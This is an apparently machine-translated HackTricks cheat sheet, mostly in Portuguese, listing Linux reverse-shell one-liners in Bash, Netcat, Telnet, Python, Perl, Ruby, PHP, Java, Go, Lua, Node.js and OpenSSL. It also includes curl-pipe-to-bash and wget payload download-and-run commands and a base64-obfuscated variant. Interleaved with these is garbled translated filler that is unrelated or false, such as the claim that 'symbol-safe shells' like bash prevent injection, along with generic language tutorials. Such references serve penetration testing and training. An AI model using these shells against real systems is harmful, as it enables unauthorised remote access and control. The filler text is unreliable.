# Shells - Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que são mais importantes para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha de tecnologia, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Se você tiver dúvidas sobre algum desses shells, você pode verificá-los com** [**https://explainshell.com/**](https://explainshell.com)

## TTY Completo

**Depois de obter um shell reverso**[ **leia esta página para obter um TTY completo**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
### Shell seguro de símbolos

Um shell seguro de símbolos é um shell que possui recursos de segurança adicionais para proteger contra ataques de injeção de código. Esses shells são projetados para tratar corretamente caracteres especiais e símbolos, evitando assim a execução de comandos indesejados.

### Shell seguro de símbolos no Linux

No Linux, existem vários shells seguros de símbolos disponíveis, como sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh e bash. É importante verificar com esses shells para garantir que o código seja executado corretamente e não haja vulnerabilidades de segurança.

Para usar um shell seguro de símbolos, você pode simplesmente substituir o shell padrão pelo shell seguro de sua escolha. Isso pode ser feito alterando a configuração do sistema ou usando comandos específicos, dependendo do sistema operacional que você está usando.

É altamente recomendável usar um shell seguro de símbolos ao desenvolver e executar scripts no Linux, pois isso ajudará a proteger seu sistema contra ataques de injeção de código e garantir a segurança de suas operações.
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Explicação do Shell

1. **`bash -i`**: Esta parte do comando inicia um shell interativo (`-i`) do Bash.
2. **`>&`**: Esta parte do comando é uma notação abreviada para **redirecionar tanto a saída padrão** (`stdout`) quanto o **erro padrão** (`stderr`) para o **mesmo destino**.
3. **`/dev/tcp/<IP-DO-ATAQUE>/<PORTA>`**: Este é um arquivo especial que **representa uma conexão TCP para o endereço IP e porta especificados**.
* Ao **redirecionar as saídas de saída e erro para este arquivo**, o comando envia efetivamente a saída da sessão interativa do shell para a máquina do atacante.
4. **`0>&1`**: Esta parte do comando **redireciona a entrada padrão (`stdin`) para o mesmo destino que a saída padrão (`stdout`)**.

### Criar em arquivo e executar
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Shell Avançado

Você pode encontrar casos em que você tem uma **Execução de Código Remoto (RCE) em um aplicativo da web em uma máquina Linux**, mas devido a regras do Iptables ou outros tipos de filtragem, **você não consegue obter um shell reverso**. Esse "shell" permite que você mantenha um shell PTY por meio dessa RCE usando pipes dentro do sistema da vítima.\
Você pode encontrar o código em [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)

Você só precisa modificar:

* A URL do host vulnerável
* O prefixo e sufixo da sua carga útil (se houver)
* A forma como a carga útil é enviada (cabeçalhos? dados? informações extras?)

Em seguida, você pode apenas **enviar comandos** ou até mesmo **usar o comando `upgrade`** para obter um PTY completo (observe que os pipes são lidos e escritos com um atraso aproximado de 1,3 segundos).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

Verifique em [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
Telnet é um protocolo de rede que permite a comunicação remota com um servidor usando uma conexão de texto simples. É amplamente utilizado para administrar dispositivos de rede, como roteadores e switches. No entanto, o Telnet não é seguro, pois as informações são transmitidas em texto simples, o que significa que qualquer pessoa que esteja interceptando a comunicação pode ler as informações confidenciais, como senhas. Portanto, é altamente recomendável usar uma conexão segura, como SSH, em vez de Telnet.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Atacante**
```bash
while true; do nc -l <port>; done
```
Para enviar o comando, escreva-o, pressione enter e pressione CTRL+D (para parar o STDIN)

**Vítima**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Python is a versatile and powerful programming language that is widely used in the field of hacking. It provides a wide range of libraries and modules that can be leveraged for various hacking tasks. In this section, we will explore some of the common Python libraries and techniques used in hacking.

### Python Shells

Python shells are interactive environments that allow you to execute Python code and interact with the results in real-time. They are particularly useful for testing and debugging code during the hacking process. Here are some popular Python shells:

- **IPython**: IPython is an enhanced interactive Python shell that provides additional features such as tab completion, object introspection, and rich media display. It is widely used by hackers for its advanced capabilities.

- **Jupyter Notebook**: Jupyter Notebook is a web-based interactive computing environment that allows you to create and share documents containing live code, equations, visualizations, and narrative text. It is commonly used for data analysis and visualization in hacking projects.

- **Python REPL**: The Python REPL (Read-Eval-Print Loop) is the default interactive shell that comes with Python. It allows you to enter Python code line by line and see the results immediately.

### Python Libraries for Hacking

Python has a vast ecosystem of libraries and modules that can be used for hacking purposes. Here are some commonly used libraries:

- **Requests**: Requests is a powerful HTTP library for Python that allows you to send HTTP requests and handle the responses. It is commonly used for web scraping, interacting with APIs, and performing various web-related hacking tasks.

- **Beautiful Soup**: Beautiful Soup is a Python library for parsing HTML and XML documents. It provides a convenient way to extract data from web pages and manipulate the HTML structure. It is often used in combination with Requests for web scraping.

- **Scapy**: Scapy is a powerful interactive packet manipulation program and library for Python. It allows you to create, send, and receive network packets, and perform various network-related hacking tasks such as packet sniffing, spoofing, and scanning.

- **Paramiko**: Paramiko is a Python implementation of the SSHv2 protocol, which allows you to securely connect to remote servers and execute commands. It is commonly used for SSH-based hacking tasks such as remote code execution and privilege escalation.

- **Pycrypto**: Pycrypto is a collection of cryptographic algorithms and protocols for Python. It provides various encryption and decryption functions, as well as hashing and random number generation. It is often used in cryptography-related hacking tasks.

### Python Frameworks for Hacking

In addition to libraries, there are also several Python frameworks that can be used for hacking purposes. These frameworks provide a higher-level abstraction and often come with built-in tools and utilities. Here are some popular Python frameworks for hacking:

- **Metasploit Framework**: Metasploit Framework is an open-source framework for developing, testing, and executing exploits. It provides a wide range of tools and modules for penetration testing and vulnerability assessment.

- **Scapy**: Scapy is not only a library but also a framework for packet manipulation. It allows you to create custom network protocols, automate network tasks, and build your own hacking tools.

- **The Sleuth Kit**: The Sleuth Kit is a collection of command-line tools and libraries for digital forensic analysis. It provides various utilities for file system analysis, memory analysis, and network analysis.

- **OWASP ZAP**: OWASP ZAP (Zed Attack Proxy) is an open-source web application security scanner. It allows you to find security vulnerabilities in web applications and perform various security testing tasks.

These are just a few examples of the many Python libraries and frameworks available for hacking. Depending on your specific needs and requirements, you may find other libraries and frameworks that are more suitable for your hacking projects.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perl é uma linguagem de programação de script de alto nível e versátil, amplamente utilizada para automação de tarefas e desenvolvimento de aplicativos web. É uma linguagem interpretada, o que significa que o código-fonte é executado diretamente, sem a necessidade de compilação prévia.

### Características do Perl

- **Expressividade**: Perl é conhecido por sua sintaxe concisa e expressiva, o que torna o código fácil de ler e escrever.

- **Flexibilidade**: Perl oferece uma ampla gama de recursos e bibliotecas, permitindo que os desenvolvedores realizem uma variedade de tarefas, desde manipulação de strings até processamento de arquivos e redes.

- **Suporte a expressões regulares**: Perl é especialmente poderoso no processamento de texto e padrões de correspondência, graças ao seu suporte nativo a expressões regulares.

- **Portabilidade**: Perl é executado em várias plataformas, incluindo Linux, Windows e macOS, tornando-o uma escolha popular para desenvolvimento multiplataforma.

### Uso de Perl em Hacking

Perl é uma ferramenta valiosa para hackers devido à sua flexibilidade e suporte a expressões regulares. Ele pode ser usado para automatizar tarefas de hacking, como varredura de portas, exploração de vulnerabilidades e extração de informações de sistemas alvo.

Além disso, Perl possui uma ampla variedade de módulos e bibliotecas disponíveis, o que facilita a criação de ferramentas personalizadas para fins de hacking.

### Exemplo de Script Perl

Aqui está um exemplo simples de um script Perl que realiza uma varredura de portas em um alvo:

```perl
#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket::INET;

my $host = "192.168.0.1";
my @ports = (22, 80, 443, 8080);

foreach my $port (@ports) {
    my $socket = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => 'tcp',
        Timeout => 3
    );

    if ($socket) {
        print "Port $port is open\n";
        close($socket);
    } else {
        print "Port $port is closed\n";
    }
}
```

Este script usa o módulo `IO::Socket::INET` para criar um soquete TCP e tentar se conectar a cada porta especificada. Se a conexão for bem-sucedida, o script imprime que a porta está aberta; caso contrário, imprime que a porta está fechada.

### Conclusão

Perl é uma linguagem poderosa e flexível que pode ser usada para uma variedade de tarefas de hacking. Sua sintaxe concisa e suporte a expressões regulares o tornam uma escolha popular entre os hackers. Com a ajuda de módulos e bibliotecas, é possível criar ferramentas personalizadas para atender às necessidades específicas de hacking.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby é uma linguagem de programação dinâmica, orientada a objetos e de código aberto. É conhecida por sua sintaxe simples e expressiva, o que a torna fácil de ler e escrever. Ruby é frequentemente usado para desenvolvimento web e scripting.

### Instalação do Ruby

Para começar a usar o Ruby, você precisa instalá-lo em seu sistema. Aqui estão as etapas para instalar o Ruby em um sistema Linux:

1. Abra o terminal.
2. Execute o seguinte comando para atualizar os pacotes do sistema:
```
sudo apt update
```
3. Em seguida, execute o comando a seguir para instalar o Ruby:
```
sudo apt install ruby-full
```
4. Após a instalação, verifique se o Ruby foi instalado corretamente executando o seguinte comando:
```
ruby --version
```
Você deve ver a versão do Ruby instalada no seu sistema.

### Executando um script Ruby

Depois de instalar o Ruby, você pode executar scripts Ruby usando o interpretador Ruby. Siga estas etapas para executar um script Ruby:

1. Crie um novo arquivo com a extensão `.rb`, por exemplo, `meu_script.rb`.
2. Abra o arquivo em um editor de texto e escreva seu código Ruby.
3. Salve o arquivo.
4. Abra o terminal e navegue até o diretório onde o arquivo `meu_script.rb` está localizado.
5. Execute o seguinte comando para executar o script:
```
ruby meu_script.rb
```
O script Ruby será executado e você verá a saída no terminal.

### Recursos adicionais

Ruby possui uma ampla gama de recursos e bibliotecas disponíveis para facilitar o desenvolvimento. Aqui estão alguns recursos adicionais que você pode explorar:

- [RubyGems](https://rubygems.org/): Um gerenciador de pacotes para Ruby que permite instalar e gerenciar bibliotecas Ruby.
- [Ruby on Rails](https://rubyonrails.org/): Um framework de desenvolvimento web popular para Ruby.
- [RDoc](https://ruby.github.io/rdoc/): Uma ferramenta para gerar documentação para código Ruby.
- [Ruby Toolbox](https://www.ruby-toolbox.com/): Um diretório de bibliotecas Ruby populares e ferramentas relacionadas.

Agora que você tem o Ruby instalado e conhece os conceitos básicos, você está pronto para começar a escrever seus próprios programas Ruby!
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

O PHP é uma linguagem de programação amplamente utilizada para desenvolvimento web. É uma linguagem de script do lado do servidor que pode ser incorporada em páginas HTML. O PHP é conhecido por sua facilidade de uso e flexibilidade, tornando-o uma escolha popular entre os desenvolvedores.

### Configurando um shell PHP

Existem várias maneiras de configurar um shell PHP em um servidor. Aqui estão algumas opções comuns:

1. **Shell reverso PHP**: Um shell reverso PHP é um script PHP que permite que um invasor acesse remotamente o servidor comprometido. Ele se conecta a um servidor controlado pelo invasor e permite que comandos sejam executados no servidor comprometido.

2. **Shell PHP baseado em arquivo**: Um shell PHP baseado em arquivo é um script PHP que é carregado em um servidor comprometido por meio de um arquivo. Ele permite que o invasor execute comandos no servidor comprometido por meio de uma interface baseada em navegador.

3. **Shell PHP embutido**: O PHP possui uma função embutida chamada `system()` que permite a execução de comandos do sistema. Um invasor pode explorar essa função para executar comandos no servidor comprometido.

### Usando um shell PHP

Depois de configurar um shell PHP em um servidor, você pode usá-lo para executar várias tarefas, como:

- **Exploração de arquivos**: Você pode navegar pelo sistema de arquivos do servidor comprometido, visualizar, editar, fazer upload e excluir arquivos.

- **Execução de comandos**: Você pode executar comandos do sistema no servidor comprometido, como listar diretórios, visualizar processos em execução e executar programas.

- **Manipulação de banco de dados**: Você pode interagir com bancos de dados no servidor comprometido, executando consultas SQL, adicionando, modificando ou excluindo registros.

- **Escalonamento de privilégios**: Se você tiver acesso limitado inicialmente, poderá usar um shell PHP para explorar vulnerabilidades e tentar obter acesso privilegiado.

### Considerações de segurança

Ao usar um shell PHP, é importante ter em mente as seguintes considerações de segurança:

- **Proteção de acesso**: Certifique-se de que apenas usuários autorizados tenham acesso ao shell PHP. Isso pode ser feito por meio de autenticação e controle de acesso.

- **Monitoramento**: Monitore regularmente o servidor comprometido em busca de atividades suspeitas ou não autorizadas.

- **Atualizações**: Mantenha o software do servidor atualizado para evitar vulnerabilidades conhecidas que possam ser exploradas.

- **Remoção**: Após concluir suas atividades, remova o shell PHP do servidor comprometido para evitar futuros acessos não autorizados.

O uso de um shell PHP pode ser uma ferramenta poderosa para hackers, mas também pode ser usado para fins legítimos, como testes de penetração e administração de sistemas. É importante usar essa técnica com responsabilidade e dentro dos limites legais.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java é uma linguagem de programação de alto nível, orientada a objetos e amplamente utilizada para desenvolvimento de aplicativos e sistemas. É uma linguagem versátil e portátil, o que significa que os programas escritos em Java podem ser executados em diferentes plataformas, como Windows, Linux e macOS, sem a necessidade de modificação do código-fonte.

### Características do Java

- **Orientação a objetos**: Java é uma linguagem orientada a objetos, o que significa que os programas são estruturados em torno de objetos que possuem atributos e comportamentos.

- **Portabilidade**: Os programas Java podem ser executados em qualquer plataforma que possua uma máquina virtual Java (JVM) instalada. Isso torna o Java uma escolha popular para o desenvolvimento de aplicativos multiplataforma.

- **Segurança**: Java possui recursos de segurança integrados que ajudam a proteger os programas contra ameaças, como acesso não autorizado e execução de código malicioso.

- **Gerenciamento de memória**: Java possui um sistema de gerenciamento de memória automático, conhecido como coletor de lixo, que libera automaticamente a memória alocada para objetos que não estão mais em uso.

### Desenvolvimento em Java

Para desenvolver aplicativos em Java, é necessário ter o Kit de Desenvolvimento Java (JDK) instalado no computador. O JDK inclui o compilador Java, que é usado para transformar o código-fonte Java em bytecode, que pode ser executado pela JVM.

O código-fonte Java é escrito em arquivos com a extensão `.java` e é organizado em classes. Cada classe contém métodos, que são blocos de código que realizam tarefas específicas.

Após escrever o código-fonte Java, ele deve ser compilado usando o comando `javac` para gerar o bytecode correspondente. Em seguida, o bytecode pode ser executado usando o comando `java`.

### Exemplo de código Java

Aqui está um exemplo simples de um programa Java que exibe a mensagem "Olá, mundo!" no console:

```java
public class OlaMundo {
    public static void main(String[] args) {
        System.out.println("Olá, mundo!");
    }
}
```

Neste exemplo, a classe `OlaMundo` contém um método `main`, que é o ponto de entrada do programa. O método `main` exibe a mensagem "Olá, mundo!" usando o método `println` da classe `System`.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

O Ncat é uma ferramenta de linha de comando que fornece funcionalidades avançadas de rede. Ele é uma versão aprimorada do comando `nc` (netcat) e é amplamente utilizado para testar e depurar conexões de rede, bem como para criar conexões de rede seguras.

### Instalação

O Ncat está disponível para várias plataformas, incluindo Linux, Windows e macOS. Para instalá-lo no Linux, você pode usar o gerenciador de pacotes da sua distribuição. Por exemplo, no Ubuntu, você pode executar o seguinte comando:

```
sudo apt-get install ncat
```

### Uso básico

O Ncat pode ser usado para várias finalidades, como transferência de arquivos, redirecionamento de portas e criação de túneis. Aqui estão alguns exemplos de uso básico:

- Conectar-se a um servidor remoto em uma porta específica:

```
ncat <endereço IP> <porta>
```

- Redirecionar uma porta local para um servidor remoto:

```
ncat -l <porta local> --sh-exec "ncat <endereço IP> <porta remota>"
```

- Criar um túnel SSH reverso:

```
ncat -l <porta local> --sh-exec "ssh -R <porta remota>:localhost:<porta local> <usuário>@<servidor>"
```

### Recursos avançados

O Ncat também oferece recursos avançados, como criptografia SSL/TLS, autenticação, compressão e muito mais. Aqui estão alguns exemplos de uso desses recursos:

- Criar uma conexão segura usando SSL/TLS:

```
ncat --ssl <endereço IP> <porta>
```

- Autenticar-se usando um certificado SSL/TLS:

```
ncat --ssl --ssl-cert <caminho para o certificado> --ssl-key <caminho para a chave privada> <endereço IP> <porta>
```

- Comprimir dados durante a transferência:

```
ncat --compress <endereço IP> <porta>
```

### Conclusão

O Ncat é uma ferramenta poderosa e versátil que pode ser usada para várias tarefas de rede. Com sua ampla gama de recursos e sua interface de linha de comando simples, o Ncat é uma escolha popular entre os profissionais de segurança e os administradores de rede.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que são mais importantes para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha de tecnologia, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
Lua é uma linguagem de programação leve, poderosa e fácil de usar. É frequentemente usada para scripting em jogos, aplicativos web e sistemas embarcados. Lua é conhecida por sua simplicidade, eficiência e flexibilidade.

### Introdução ao Lua

Lua é uma linguagem interpretada, o que significa que o código Lua é executado por um interpretador em vez de ser compilado em código de máquina. Isso torna o desenvolvimento e a execução de programas Lua rápidos e fáceis.

### Características do Lua

- Simplicidade: Lua possui uma sintaxe simples e clara, o que a torna fácil de aprender e usar.
- Eficiência: Lua é projetada para ser rápida e eficiente, com um baixo consumo de recursos.
- Flexibilidade: Lua é altamente flexível e pode ser estendida com facilidade através de bibliotecas e módulos.
- Portabilidade: Lua é uma linguagem portátil e pode ser executada em várias plataformas, incluindo Windows, Linux e macOS.

### Usando Lua

Para começar a usar Lua, você precisa ter o interpretador Lua instalado em seu sistema. Você pode baixar o interpretador Lua em [lua.org](https://www.lua.org).

Depois de instalar o interpretador Lua, você pode executar programas Lua usando o comando `lua` seguido do nome do arquivo Lua. Por exemplo:

```lua
lua meu_programa.lua
```

### Exemplo de código Lua

Aqui está um exemplo simples de um programa Lua que exibe uma mensagem na tela:

```lua
-- Define uma função para exibir uma mensagem
function exibirMensagem()
    print("Olá, Lua!")
end

-- Chama a função para exibir a mensagem
exibirMensagem()
```

Neste exemplo, definimos uma função chamada `exibirMensagem` que imprime a mensagem "Olá, Lua!" na tela. Em seguida, chamamos essa função para exibir a mensagem.

### Conclusão

Lua é uma linguagem de programação poderosa e flexível que pode ser usada para uma variedade de finalidades, desde scripting em jogos até desenvolvimento de aplicativos web. Com sua sintaxe simples e eficiência, Lua é uma ótima escolha para desenvolvedores que desejam uma linguagem fácil de aprender e usar.
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

O NodeJS é uma plataforma de desenvolvimento de aplicativos em JavaScript que permite a execução de código JavaScript no lado do servidor. Ele utiliza o mecanismo de JavaScript do Chrome para fornecer um ambiente de execução rápido e eficiente. O NodeJS é amplamente utilizado para criar aplicativos web escaláveis e em tempo real, bem como para desenvolver ferramentas de linha de comando.

### Instalação do NodeJS

Para instalar o NodeJS, siga as etapas abaixo:

1. Acesse o site oficial do NodeJS em [nodejs.org](https://nodejs.org) e faça o download da versão adequada para o seu sistema operacional.

2. Execute o instalador baixado e siga as instruções do assistente de instalação.

3. Após a conclusão da instalação, abra o terminal e verifique se o NodeJS foi instalado corretamente digitando o seguinte comando:

   ```
   node --version
   ```

   Isso exibirá a versão do NodeJS instalada no seu sistema.

### Executando um arquivo JavaScript com o NodeJS

Para executar um arquivo JavaScript com o NodeJS, siga as etapas abaixo:

1. Abra o terminal e navegue até o diretório onde o arquivo JavaScript está localizado.

2. Digite o seguinte comando para executar o arquivo:

   ```
   node nome_do_arquivo.js
   ```

   Substitua "nome_do_arquivo.js" pelo nome do arquivo JavaScript que você deseja executar.

   O NodeJS executará o arquivo JavaScript e exibirá a saída no terminal.

### Gerenciamento de pacotes com o npm

O npm (Node Package Manager) é um gerenciador de pacotes para o NodeJS. Ele permite instalar, atualizar e remover pacotes JavaScript facilmente em um projeto.

Para usar o npm, siga as etapas abaixo:

1. Abra o terminal e navegue até o diretório do seu projeto.

2. Digite o seguinte comando para inicializar o projeto e criar o arquivo `package.json`:

   ```
   npm init
   ```

   Siga as instruções do assistente para configurar o projeto.

3. Para instalar um pacote, digite o seguinte comando:

   ```
   npm install nome_do_pacote
   ```

   Substitua "nome_do_pacote" pelo nome do pacote que você deseja instalar.

4. Para atualizar um pacote, digite o seguinte comando:

   ```
   npm update nome_do_pacote
   ```

   Substitua "nome_do_pacote" pelo nome do pacote que você deseja atualizar.

5. Para remover um pacote, digite o seguinte comando:

   ```
   npm uninstall nome_do_pacote
   ```

   Substitua "nome_do_pacote" pelo nome do pacote que você deseja remover.

O npm também permite gerenciar dependências entre pacotes, executar scripts personalizados e muito mais. Consulte a documentação oficial do npm para obter mais informações.
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

O Atacante (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
# O Alvo

O primeiro passo em qualquer teste de penetração é identificar o alvo. O alvo é o sistema ou rede que será testado quanto à sua segurança. Antes de iniciar o teste, é importante obter informações detalhadas sobre o alvo, como endereços IP, nomes de domínio, serviços em execução e qualquer outra informação relevante.

## Identificando o Alvo

Existem várias técnicas que podem ser usadas para identificar o alvo. Alguns métodos comuns incluem:

- Pesquisa de DNS: Pesquisar registros DNS pode revelar informações sobre os servidores e serviços associados ao alvo.
- Varredura de portas: A varredura de portas pode ajudar a identificar quais portas estão abertas no alvo e quais serviços estão sendo executados.
- Enumeração de serviços: A enumeração de serviços envolve a identificação dos serviços em execução no alvo, como servidores web, servidores de banco de dados, servidores de e-mail, etc.
- Pesquisa de informações públicas: A pesquisa de informações públicas pode revelar informações sobre o alvo, como endereços de e-mail, nomes de usuários, números de telefone, etc.

## Coletando Informações

Depois de identificar o alvo, o próximo passo é coletar informações detalhadas sobre ele. Isso pode incluir:

- Identificação de versões de software: Identificar as versões de software em execução no alvo pode ajudar a identificar vulnerabilidades conhecidas.
